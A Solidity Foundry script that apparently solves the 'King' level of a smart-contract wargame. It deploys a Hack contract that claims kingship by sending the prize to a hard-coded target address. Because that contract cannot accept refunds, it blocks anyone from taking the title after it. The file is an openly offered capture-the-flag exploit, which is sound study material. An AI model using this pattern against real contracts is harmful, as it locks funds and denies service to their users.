// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.20;

import "../src/King.sol";
import {Script} from "forge-std/Script.sol";

contract Hack {
    King target;

    constructor() payable {
        target = King(payable(0xe92d38D134FDA9573550de41954361b3d5Ed5b99));
    }

    function takeKingmanship() public payable {
        uint256 amount = target.prize();
        (bool success,) = address(target).call{value: amount}("");
        require(success, "Failed to transfer Kingmanship");
    }
}

contract KingSolution is Script {
    King public target = King(payable(0xe92d38D134FDA9573550de41954361b3d5Ed5b99));

    function run() external payable {
        vm.startBroadcast(vm.envUint("MY_PRIVATE_KEY"));
        Hack hack = new Hack();
        hack.takeKingmanship{value: target.prize()}();
        vm.stopBroadcast();
    }
}
